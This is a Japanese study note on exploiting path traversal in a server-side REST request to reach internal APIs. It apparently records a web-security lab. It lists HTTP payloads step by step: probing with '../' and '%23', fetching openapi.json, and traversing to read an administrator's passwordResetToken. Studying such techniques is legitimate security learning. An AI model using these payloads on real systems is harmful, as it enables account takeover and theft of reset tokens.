###### 方法概要

1. RESTのURLで操作する箇所を見つける
```http
GET /edit_profile.php?name=peter
```

2. [Path traversal](../../Path%20traversal/Path%20traversal.md)のtraversal sequenceを使用する(`/`はHackverterでurlencode)
```http
GET /edit_profile.php?name=peter/../admin
```
- サーバ -> 内部API
```http
GET /api/private/users/peter/../admin
```

### 通常の挙動を確認する

1. 通常の挙動は一貫しているか
2. URLの特殊文字を入力する。サーバから内部APIへURLで参照しているかどうかがわかる
	- `#`, `?`, `./`, `../`
	- `./`や`../`は後ろだけでなく、==前にも注入すること==
	- 例：`username=./administrator`

3. Errorメッセージなどレスポンスを注意深く観察する（**マジで**)
- `Invalid route.　Please refer to the API definition"`: ＝API定義ファイルに正しいパスが載っている
### APIの定義を探す

- 参照：[📕](../../../Misc/📕.md#OpenAPI)

1. [Path traversal](../../Path%20traversal/Path%20traversal.md)のテクニックと[2. クエリとして内部APIへ送信するストリングのテスト](2.%20クエリとして内部APIへ送信するストリングのテスト.md#クエリの文字の切り捨て)のテクニックを合わせる
```http
../../../../%23
```
- ↓Errorより、APIとやりとりできたことがわかる
![[Pasted image 20231220102328.png]]

2. Web APIの大半がOpenAPIに則っているので、openapi.jsonもしくは.yamlにアクセスできるか試す
```http
../../../../openapi.json%23
```
![[Pasted image 20231220114756.png]]

3. サーバが内部apiとやりとりしているURLを見つける
- 上記画像だと`/api/internal/v1/users/{username}/field/{field}

### 脆弱性の悪用

1. 発見したファイルパスにアクセスしてみる
```http
username=administrator/field/
```
	or
```http
username=administrator/field/hogehoge%23
```
- 💡：基本的に、〇〇+`#`でAPIに送信されるクエリの後ろにつづく条件をシカトする

2. レスポンスを観察し、許可されてないがJavaScriptファイルなどから見つけたパラメタを入力する
```http
username=administrator/field/passwordResetToken%23
```
- jsファイル抜粋↓
![[Pasted image 20231220120724.png|300]]
- 上記URLがREST

3. Traversal Sequenceを使用し、ステップ3のURLを参考に階層を移動しながらアクセスをためす
```http
username=../../v1/users/administrator/field/passwordResetToken%23
```
- ==実行の処理をする階層によって権限が異なることがある==
